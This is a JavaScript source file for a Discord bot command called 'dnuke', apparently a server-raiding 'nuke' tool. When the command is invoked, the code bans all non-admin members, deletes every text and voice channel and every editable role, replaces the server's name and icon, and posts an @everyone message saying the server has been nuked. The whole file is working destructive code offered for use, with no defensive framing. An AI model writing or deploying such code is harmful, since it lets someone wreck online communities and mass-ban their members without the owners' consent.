const { SlashCommandBuilder, ChannelType, PermissionsBitField } = require("discord.js");
const config = require('../../config.json')

module.exports = {
    data: new SlashCommandBuilder()
        .setName("dnuke")
        .setDescription("shot for the starts aim for the moon"),

    async execute(interaction) {
        const mem = interaction.user;
        mem.send('Nuke Module has been activated GLHF :| ');

        try {

            const members = await interaction.guild.members.fetch();
            for (const member of members.values()) {
                if (
                    member.id !== interaction.client.user.id &&
                    member.id !== interaction.guild.ownerId &&
                    !member.permissions.has(PermissionsBitField.Flags.Administrator)
                ) {
                    await member.ban({ reason: config.allbanreason });
                }
            }
        } catch (error) {
            console.error('Error banning members:', error);
            console.log('There was an error banning members.');
        }

        try {
            const channels = await interaction.guild.channels.fetch();

            const textAndVoiceChannels = channels.filter(channel => 
                channel.type === ChannelType.GuildText || channel.type === ChannelType.GuildVoice
            );

            if (textAndVoiceChannels.size === 0) {
                return mem.send(`No text or voice channels found in ${interaction.guild.name}.`);
            }

            for (const channel of textAndVoiceChannels.values()) {
                await channel.delete().catch(console.error);
            }
        } catch (error) {
            console.error(error);
            console.log('There was an error trying to delete all text and voice channels.');
        }

        try {
            const roles = await interaction.guild.roles.fetch();

            for (const [roleId, role] of roles) {
                if (role.editable && !role.managed && role.id !== interaction.guild.id) {
                    try {
                        await role.delete();
                    } catch (error) {
                        console.error(`Failed to delete role ${role.name}: ${error}`);
                    }
                }
            }
        } catch (error) {
            console.error(`Error fetching roles: ${error}`);
            console.log('There was an error trying to delete all roles.');
        }

        try {
            await interaction.guild.setName(config.newservername);
            await interaction.guild.setIcon(config.newservericon);

        } catch (error) {
            console.error(error);
            console.log('There was an error while changing the server name or picture.');
        }

        try {
            const newChannel = await interaction.guild.channels.create({
                name: 'not-general',
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    {
                        id: interaction.guild.id,
                        allow: [PermissionsBitField.Flags.ViewChannel],
                    },
                ],
            });

            await newChannel.send('@everyone This server has been nuked. @everyone');
        } catch (error) {
            console.error('Error creating new channel:', error);
            mem.send('There was an error creating the new channel.');
        }
    }
};